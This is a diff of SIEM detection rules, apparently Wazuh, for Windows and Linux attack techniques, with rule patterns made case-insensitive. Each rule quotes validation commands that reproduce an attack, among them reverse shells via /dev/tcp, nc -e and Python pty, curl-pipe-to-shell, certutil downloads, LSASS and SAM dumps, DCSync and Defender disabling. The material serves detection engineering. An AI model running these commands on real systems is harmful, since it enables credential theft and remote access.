@@ -16,8 +16,8 @@
 <group name="sysmon,">
   <rule id="100100" level="8">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image">\\bitsadmin\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">/transfer|/addfile|/setnotifycmdline</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\bitsadmin\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)/transfer|/addfile|/setnotifycmdline</field>
     <description>File Transfer via BITS (1/2: bitsadmin_cli)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1197): bitsadmin /transfer tyriantest /download /priority high http://127.0.0.1/a.txt C:\Windows\Temp\a.txt | Start-BitsTransfer -Source http://127.0.0.1/a.txt -Destination C:\Windows\Temp\a.txt</info>
@@ -32,7 +32,7 @@
 <group name="sysmon,">
   <rule id="100101" level="8">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.commandLine" type="pcre2">(?=.*Start\-BitsTransfer)(?=.*\-Source)</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)(?=.*Start\-BitsTransfer)(?=.*\-Source)</field>
     <description>File Transfer via BITS (2/2: powershell_bits)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1197): bitsadmin /transfer tyriantest /download /priority high http://127.0.0.1/a.txt C:\Windows\Temp\a.txt | Start-BitsTransfer -Source http://127.0.0.1/a.txt -Destination C:\Windows\Temp\a.txt</info>
@@ -50,8 +50,8 @@
 <group name="sysmon,">
   <rule id="100102" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.system.eventID" type="pcre2">^17$|^18$</field>
-    <field name="win.eventdata.pipeName" type="pcre2">^\\msagent_|^\\postex_|^\\postex_ssh_|^\\status_|^\\MSSE\-|^\\mojo_|^\\netsvc_</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^17$|^18$</field>
+    <field name="win.eventdata.pipeName" type="pcre2">(?i)^\\msagent_|^\\postex_|^\\postex_ssh_|^\\status_|^\\MSSE\-|^\\mojo_|^\\netsvc_</field>
     <description>Cobalt Strike Default Named Pipe</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1055): Run a Cobalt Strike beacon with a default malleable profile and start an SMB | beacon or a post-exploitation job (for example `run whoami`), which creates a | postex_ pipe. On a range, any process creating a pipe named \msagent_test | reproduces the telemetry.</info>
@@ -69,8 +69,8 @@
 <group name="sysmon,">
   <rule id="100103" level="8">
     <if_group>sysmon_event1</if_group>
-    <field name="win.system.eventID">^22$</field>
-    <field name="win.eventdata.queryName">^[A-Za-z0-9+/=_-]{40,}\\.</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^22$</field>
+    <field name="win.eventdata.queryName" type="pcre2">^[A-Za-z0-9+/=_-]{40,}\.</field>
     <frequency>10</frequency>
     <timeframe>300</timeframe>
     <same_field>host</same_field>
@@ -90,8 +90,8 @@
 <group name="windows,windows_security,">
   <rule id="100104" level="14">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID" type="pcre2">^4886$|^4887$</field>
-    <field name="win.eventdata.attributes" type="pcre2">SAN:|subjectaltname|upn=</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^4886$|^4887$</field>
+    <field name="win.eventdata.attributes" type="pcre2">(?i)SAN:|subjectaltname|upn=</field>
     <description>ADCS Certificate Requested With an Arbitrary Subject Alternative Name</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1649): certipy req -u user@domain -p pass -target ca.domain -template VulnTemplate -upn administrator@domain | Certify.exe request /ca:ca.domain\CA-NAME /template:VulnTemplate /altname:administrator</info>
@@ -108,9 +108,9 @@
 <group name="windows,windows_security,">
   <rule id="100105" level="12">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID" type="pcre2">^4886$|^4887$</field>
-    <field name="win.eventdata.requester">\$$</field>
-    <field name="win.eventdata.attributes" type="pcre2">CertificateTemplate:User|CertificateTemplate:DomainController|CertificateTemplate:KerberosAuthentication</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^4886$|^4887$</field>
+    <field name="win.eventdata.requester" type="pcre2">(?i)\$$</field>
+    <field name="win.eventdata.attributes" type="pcre2">(?i)CertificateTemplate:User|CertificateTemplate:DomainController|CertificateTemplate:KerberosAuthentication</field>
     <description>ADCS Certificate Issued to a Machine Account on a User Template</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1649): PetitPotam.py -u user -p pass &lt;attacker-ip&gt; &lt;dc-ip&gt; | ntlmrelayx.py -t http://ca.domain/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</info>
@@ -128,9 +128,9 @@
 <group name="windows,windows_security,">
   <rule id="100106" level="12">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^4768$</field>
-    <field name="win.eventdata.ticketOptions">^0x40810010$</field>
-    <field name="win.eventdata.ticketEncryptionType" type="pcre2">^0x17$|^0x18$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^4768$</field>
+    <field name="win.eventdata.ticketOptions" type="pcre2">(?i)^0x40810010$</field>
+    <field name="win.eventdata.ticketEncryptionType" type="pcre2">(?i)^0x17$|^0x18$</field>
     <description>AS-REP Roasting via Accounts Without Kerberos Pre-Authentication</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1558.004): Rubeus.exe asreproast /format:hashcat | GetNPUsers.py -dc-ip &lt;dc&gt; &lt;domain&gt;/ -usersfile users.txt</info>
@@ -148,8 +148,8 @@
 <group name="windows,windows_security,">
   <rule id="100107" level="14">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^4662$</field>
-    <field name="win.eventdata.properties" type="pcre2">1131f6aa\-9c07\-11d1\-f79f\-00c04fc2dcd2|1131f6ad\-9c07\-11d1\-f79f\-00c04fc2dcd2|89e95b76\-444d\-4c62\-991a\-0facbeda640c</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^4662$</field>
+    <field name="win.eventdata.properties" type="pcre2">(?i)1131f6aa\-9c07\-11d1\-f79f\-00c04fc2dcd2|1131f6ad\-9c07\-11d1\-f79f\-00c04fc2dcd2|89e95b76\-444d\-4c62\-991a\-0facbeda640c</field>
     <description>DCSync Directory Replication From a Non-Domain-Controller</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1003.006): mimikatz.exe "lsadump::dcsync /user:krbtgt" exit | secretsdump.py -just-dc &lt;domain&gt;/&lt;user&gt;@&lt;dc&gt;</info>
@@ -167,9 +167,9 @@
 <group name="windows,windows_security,">
   <rule id="100108" level="12">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^4769$</field>
-    <field name="win.eventdata.ticketEncryptionType">^0x17$</field>
-    <field name="win.eventdata.ticketOptions">^0x40810000$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^4769$</field>
+    <field name="win.eventdata.ticketEncryptionType" type="pcre2">(?i)^0x17$</field>
+    <field name="win.eventdata.ticketOptions" type="pcre2">(?i)^0x40810000$</field>
     <description>Kerberoasting via RC4 Service Ticket Request</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1558.003): Rubeus.exe kerberoast /rc4opsec | GetUserSPNs.py -request &lt;domain&gt;/&lt;user&gt;</info>
@@ -187,8 +187,8 @@
 <group name="windows,windows_security,">
   <rule id="100109" level="14">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID" type="pcre2">^4723$|^4724$|^4738$</field>
-    <field name="win.eventdata.targetUserName">^krbtgt</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^4723$|^4724$|^4738$</field>
+    <field name="win.eventdata.targetUserName" type="pcre2">(?i)^krbtgt</field>
     <description>krbtgt Account Password Reset or Modified</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1558.001): Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (Read-Host -AsSecureString)</info>
@@ -205,7 +205,7 @@
 <group name="linux,audit,">
   <rule id="100110" level="12">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_shadow$</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_shadow$</field>
     <description>Linux Password Hash File Accessed by a User</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1003.008): sudo cat /etc/shadow &gt; /dev/null | sudo unshadow /etc/passwd /etc/shadow &gt; /tmp/creds.txt</info>
@@ -222,9 +222,9 @@
 <group name="sysmon,">
   <rule id="100111" level="14">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image">\\\\rundll32\.exe$</field>
-    <field name="win.eventdata.commandLine">comsvcs</field>
-    <field name="win.eventdata.commandLine" type="pcre2">MiniDump|\#24</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\rundll32\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)comsvcs</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)MiniDump|\#24</field>
     <description>LSASS Dump via comsvcs.dll MiniDump</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1003.001): rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;lsass_pid&gt; C:\Windows\Temp\l.dmp full</info>
@@ -241,8 +241,8 @@
 <group name="windows,">
   <rule id="100112" level="12">
     <if_group>windows</if_group>
-    <field name="win.eventdata.targetImage">\\lsass\.exe$</field>
-    <field name="win.eventdata.grantedAccess" type="pcre2">^0x1010$|^0x1410$|^0x143a$|^0x1438$</field>
+    <field name="win.eventdata.targetImage" type="pcre2">(?i)\\lsass\.exe$</field>
+    <field name="win.eventdata.grantedAccess" type="pcre2">(?i)^0x1010$|^0x1410$|^0x143a$|^0x1438$</field>
     <description>LSASS Memory Access with Read Rights</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1003.001): procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\l.dmp</info>
@@ -261,8 +261,8 @@
 <group name="sysmon,">
   <rule id="100113" level="14">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image">\\\\ntdsutil\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">(?=.*create)(?=.*ifm)</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\ntdsutil\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)(?=.*create)(?=.*ifm)</field>
     <description>NTDS.dit Extraction via ntdsutil or Shadow Copy (1/2: ntdsutil)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1003.003): ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ifm" q q</info>
@@ -276,7 +276,7 @@
 <group name="sysmon,">
   <rule id="100114" level="14">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.commandLine">ntds\.dit</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)ntds\.dit</field>
     <description>NTDS.dit Extraction via ntdsutil or Shadow Copy (2/2: ditcopy)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1003.003): ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ifm" q q</info>
@@ -293,8 +293,8 @@
 <group name="windows,windows_security,">
   <rule id="100115" level="12">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^4625$</field>
-    <field name="win.eventdata.subStatus">^0xc000006a$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^4625$</field>
+    <field name="win.eventdata.subStatus" type="pcre2">(?i)^0xc000006a$</field>
     <frequency>10</frequency>
     <timeframe>300</timeframe>
     <same_field>win.eventdata.ipAddress</same_field>
@@ -314,9 +314,9 @@
 <group name="sysmon,">
   <rule id="100116" level="14">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image">\\\\reg\.exe$</field>
-    <field name="win.eventdata.commandLine">save</field>
-    <field name="win.eventdata.commandLine" type="pcre2">hklm\\\\sam|hklm\\\\system|hklm\\\\security</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\reg\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)save</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)hklm\\sam|hklm\\system|hklm\\security</field>
     <description>SAM and SYSTEM Registry Hive Dump</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1003.002): reg save HKLM\SAM C:\Windows\Temp\sam.hiv | reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv</info>
@@ -333,8 +333,8 @@
 <group name="windows,windows_security,">
   <rule id="100117" level="14">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^5136$</field>
-    <field name="win.eventdata.attributeLDAPDisplayName">^msDS\-KeyCredentialLink$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
+    <field name="win.eventdata.attributeLDAPDisplayName" type="pcre2">(?i)^msDS\-KeyCredentialLink$</field>
     <description>Shadow Credentials Added via msDS-KeyCredentialLink</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1556): Whisker.exe add /target:DC01$ | pywhisker.py -d domain -u user -p pass --target victim --action add</info>
@@ -352,8 +352,8 @@
 <group name="sysmon,">
   <rule id="100118" level="14">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.targetObject">\\\\WDigest\\\\UseLogonCredential$</field>
-    <field name="win.eventdata.details">^DWORD\ \(0x00000001\)$</field>
+    <field name="win.eventdata.targetObject" type="pcre2">(?i)\\WDigest\\UseLogonCredential$</field>
+    <field name="win.eventdata.details" type="pcre2">(?i)^DWORD\ \(0x00000001\)$</field>
     <description>WDigest UseLogonCredential Enabled (Cleartext Credential Staging)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1112): reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f</info>
@@ -371,8 +371,8 @@
 <group name="windows,windows_security,">
   <rule id="100119" level="14">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^5137$</field>
-    <field name="win.eventdata.objectClass">^nTDSDSA$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^5137$</field>
+    <field name="win.eventdata.objectClass" type="pcre2">(?i)^nTDSDSA$</field>
     <description>DCShadow Rogue Domain Controller Registration (1/2: ntdsdsa_object)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1207): mimikatz "lsadump::dcshadow /object:target /attribute:primaryGroupID /value:512" | mimikatz "lsadump::dcshadow /push"</info>
@@ -386,9 +386,9 @@
 <group name="windows,windows_security,">
   <rule id="100120" level="14">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^5136$</field>
-    <field name="win.eventdata.attributeLDAPDisplayName">^servicePrincipalName$</field>
-    <field name="win.eventdata.attributeValue" type="pcre2">GC/|E3514235\-4B06\-11D1\-AB04\-00C04FC2DCD2</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
+    <field name="win.eventdata.attributeLDAPDisplayName" type="pcre2">(?i)^servicePrincipalName$</field>
+    <field name="win.eventdata.attributeValue" type="pcre2">(?i)GC/|E3514235\-4B06\-11D1\-AB04\-00C04FC2DCD2</field>
     <description>DCShadow Rogue Domain Controller Registration (2/2: dc_spn_added)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1207): mimikatz "lsadump::dcshadow /object:target /attribute:primaryGroupID /value:512" | mimikatz "lsadump::dcshadow /push"</info>
@@ -405,7 +405,7 @@
 <group name="sysmon,">
   <rule id="100121" level="14">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.commandLine" type="pcre2">Set\-MpPreference\ \-DisableRealtimeMonitoring\ \$true|DisableRealtimeMonitoring\ 1|Add\-MpPreference\ \-ExclusionPath|DisableAntiSpyware</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)Set\-MpPreference\ \-DisableRealtimeMonitoring\ \$true|DisableRealtimeMonitoring\ 1|Add\-MpPreference\ \-ExclusionPath|DisableAntiSpyware</field>
     <description>Microsoft Defender Protection Disabled</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1562.001): Set-MpPreference -DisableRealtimeMonitoring $true</info>
@@ -422,7 +422,7 @@
 <group name="windows,windows_security,">
   <rule id="100122" level="14">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID" type="pcre2">^1102$|^104$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^1102$|^104$</field>
     <description>Security or System Event Log Cleared</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1070.001): wevtutil cl Security</info>
@@ -440,7 +440,7 @@
 <group name="linux,audit,">
   <rule id="100123" level="14">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_auditcfg$</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_auditcfg$</field>
     <description>Linux Audit Subsystem Tampered With (1/2: config_or_binary)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1562.001): auditctl -e 0 | systemctl stop auditd</info>
@@ -454,9 +454,9 @@
 <group name="linux,audit,">
   <rule id="100124" level="14">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.exe" type="pcre2">/systemctl$|/service$</field>
-    <field name="audit.execve.a2">audit</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.exe" type="pcre2">(?i)/systemctl$|/service$</field>
+    <field name="audit.execve.a2" type="pcre2">(?i)audit</field>
     <description>Linux Audit Subsystem Tampered With (2/2: service_stop)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1562.001): auditctl -e 0 | systemctl stop auditd</info>
@@ -473,8 +473,8 @@
 <group name="linux,audit,">
   <rule id="100125" level="12">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.exe" type="pcre2">^/tmp/|^/var/tmp/|^/dev/shm/</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.exe" type="pcre2">(?i)^/tmp/|^/var/tmp/|^/dev/shm/</field>
     <description>Linux Execution From a World-Writable Directory</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1036.005): cp /bin/echo /dev/shm/updater &amp;&amp; /dev/shm/updater staged</info>
@@ -491,7 +491,7 @@
 <group name="linux,audit,">
   <rule id="100126" level="12">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_logdel$</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_logdel$</field>
     <description>Linux Log Files Deleted From /var/log</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1070.002): rm -f /var/log/tyrian-test.log | mv /var/log/auth.log /var/log/auth.log.bak</info>
@@ -508,7 +508,7 @@
 <group name="windows,powershell,">
   <rule id="100127" level="14">
     <if_group>windows</if_group>
-    <field name="win.eventdata.scriptBlockText" type="pcre2">amsiInitFailed|AmsiUtils|AmsiScanBuffer|System\.Management\.Automation\.AmsiUtils</field>
+    <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)amsiInitFailed|AmsiUtils|AmsiScanBuffer|System\.Management\.Automation\.AmsiUtils</field>
     <description>AMSI Bypass Attempt in PowerShell</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1562.001): Run the classic amsiInitFailed reflection one-liner in a PowerShell session with | script block logging (EID 4104) enabled.</info>
@@ -525,7 +525,7 @@
 <group name="sysmon,">
   <rule id="100128" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.system.eventID">^25$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^25$</field>
     <description>Process Image Tampering (Hollowing or Herpaderping)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1055.012): Run any hollowing proof of concept that starts a suspended process | (for example svchost.exe), unmaps its section and writes a replacement image. | Requires Sysmon 13 or later for event ID 25.</info>
@@ -542,8 +542,8 @@
 <group name="sysmon,">
   <rule id="100129" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.system.eventID">^8$</field>
-    <field name="win.eventdata.targetImage" type="pcre2">\\lsass\.exe$|\\explorer\.exe$|\\svchost\.exe$|\\winlogon\.exe$|\\notepad\.exe$|\\rundll32\.exe$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^8$</field>
+    <field name="win.eventdata.targetImage" type="pcre2">(?i)\\lsass\.exe$|\\explorer\.exe$|\\svchost\.exe$|\\winlogon\.exe$|\\notepad\.exe$|\\rundll32\.exe$</field>
     <description>Remote Thread Created in Another Process</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1055): Invoke-Mimikatz style injection, or any tool calling OpenProcess + | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread against notepad.exe. | Atomic Red Team T1055 includes a minimal C# injector for this.</info>
@@ -563,8 +563,8 @@
 <group name="sysmon,">
   <rule id="100130" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image">\\rundll32\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">\\Users\\Public\\|\\AppData\\Local\\Temp\\|\\Windows\\Temp\\|\\ProgramData\\|C:\\Users\\</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\rundll32\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)\\Users\\Public\\|\\AppData\\Local\\Temp\\|\\Windows\\Temp\\|\\ProgramData\\|C:\\Users\\</field>
     <description>rundll32 Loading a Payload From a Suspicious Location (1/2: writable_path)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1218.011): rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('tyrian') | rundll32.exe C:\Windows\Temp\payload.dll,EntryPoint</info>
@@ -578,8 +578,8 @@
 <group name="sysmon,">
   <rule id="100131" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image">\\rundll32\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">javascript:|vbscript:|mshtml,RunHTMLApplication|url\.dll,OpenURL|shell32\.dll,ShellExec_RunDLL</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\rundll32\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)javascript:|vbscript:|mshtml,RunHTMLApplication|url\.dll,OpenURL|shell32\.dll,ShellExec_RunDLL</field>
     <description>rundll32 Loading a Payload From a Suspicious Location (2/2: script_handler)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1218.011): rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('tyrian') | rundll32.exe C:\Windows\Temp\payload.dll,EntryPoint</info>
@@ -596,7 +596,7 @@
 <group name="sysmon,">
   <rule id="100132" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.commandLine" type="pcre2">sharphound|\-c\ all|\-\-collectionmethod|Invoke\-BloodHound|bloodhound\.py</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)sharphound|\-c\ all|\-\-collectionmethod|Invoke\-BloodHound|bloodhound\.py</field>
     <description>Active Directory Collection Consistent With SharpHound</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1087.002): SharpHound.exe -c All --zipfilename loot</info>
@@ -613,7 +613,7 @@
 <group name="sysmon,">
   <rule id="100133" level="8">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.commandLine" type="pcre2">net\ group\ "domain\ admins"|net\ localgroup\ administrators|nltest\ /domain_trusts|nltest\ /dclist|whoami\ /groups|net\ user\ /domain</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)net\ group\ "domain\ admins"|net\ localgroup\ administrators|nltest\ /domain_trusts|nltest\ /dclist|whoami\ /groups|net\ user\ /domain</field>
     <frequency>3</frequency>
     <timeframe>600</timeframe>
     <same_field>host</same_field>
@@ -634,8 +634,8 @@
 <group name="linux,audit,">
   <rule id="100134" level="8">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.exe" type="pcre2">/whoami$|/id$|/uname$|/hostname$|/lastlog$|/last$|/w$|/netstat$|/ss$|/lsof$|/crontab$</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.exe" type="pcre2">(?i)/whoami$|/id$|/uname$|/hostname$|/lastlog$|/last$|/w$|/netstat$|/ss$|/lsof$|/crontab$</field>
     <frequency>5</frequency>
     <timeframe>300</timeframe>
     <same_field>host</same_field>
@@ -656,8 +656,8 @@
 <group name="sysmon,">
   <rule id="100135" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image">\\\\certutil\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">urlcache|verifyctl|decode|\-f\ http</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\certutil\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)urlcache|verifyctl|decode|\-f\ http</field>
     <description>certutil Used as a Downloader</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1105): certutil.exe -urlcache -split -f http://&lt;host&gt;/payload.txt C:\Windows\Temp\p.txt</info>
@@ -674,8 +674,8 @@
 <group name="linux,audit,">
   <rule id="100136" level="8">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.execve.a2">(curl|wget)[^|]*\|\s*(sudo\s+)?(ba|z|k)?sh</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.execve.a2" type="pcre2">(curl|wget)[^|]*\|\s*(sudo\s+)?(ba|z|k)?sh</field>
     <description>Linux Remote Payload Piped Directly Into a Shell</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1059.004): sh -c 'curl -s http://127.0.0.1/install.sh | bash' | sh -c 'wget -qO- http://127.0.0.1/install.sh | sh'</info>
@@ -694,8 +694,8 @@
 <group name="linux,audit,">
   <rule id="100137" level="14">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.execve.a2">/dev/tcp/</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.execve.a2" type="pcre2">(?i)/dev/tcp/</field>
     <description>Linux Reverse Shell Execution (1/3: bash_devtcp)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1059.004): sh -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1' | nc -e /bin/sh 127.0.0.1 4444 | python3 -c 'import socket,pty;s=socket.socket();s.connect(("127.0.0.1",4444));pty.spawn("/bin/bash")'</info>
@@ -709,9 +709,9 @@
 <group name="linux,audit,">
   <rule id="100138" level="14">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.exe" type="pcre2">/nc$|/ncat$|/netcat$|/nc\.openbsd$|/nc\.traditional$</field>
-    <field name="audit.execve.a1">\-e</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.exe" type="pcre2">(?i)/nc$|/ncat$|/netcat$|/nc\.openbsd$|/nc\.traditional$</field>
+    <field name="audit.execve.a1" type="pcre2">(?i)\-e</field>
     <description>Linux Reverse Shell Execution (2/3: netcat_exec)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1059.004): sh -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1' | nc -e /bin/sh 127.0.0.1 4444 | python3 -c 'import socket,pty;s=socket.socket();s.connect(("127.0.0.1",4444));pty.spawn("/bin/bash")'</info>
@@ -725,8 +725,8 @@
 <group name="linux,audit,">
   <rule id="100139" level="14">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.execve.a2" type="pcre2">(?=.*socket)(?=.*pty\.spawn)</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.execve.a2" type="pcre2">(?i)(?=.*socket)(?=.*pty\.spawn)</field>
     <description>Linux Reverse Shell Execution (3/3: python_pty)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1059.004): sh -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1' | nc -e /bin/sh 127.0.0.1 4444 | python3 -c 'import socket,pty;s=socket.socket();s.connect(("127.0.0.1",4444));pty.spawn("/bin/bash")'</info>
@@ -743,8 +743,8 @@
 <group name="sysmon,">
   <rule id="100140" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image">\\\\mshta\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">http://|https://|javascript:|vbscript:|\.hta</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\mshta\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)http://|https://|javascript:|vbscript:|\.hta</field>
     <description>mshta Executing a Remote or Script Payload</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1218.005): mshta.exe http://&lt;host&gt;/payload.hta</info>
@@ -761,9 +761,9 @@
 <group name="sysmon,">
   <rule id="100141" level="12">
     <if_group>sysmon_event1</if_group>
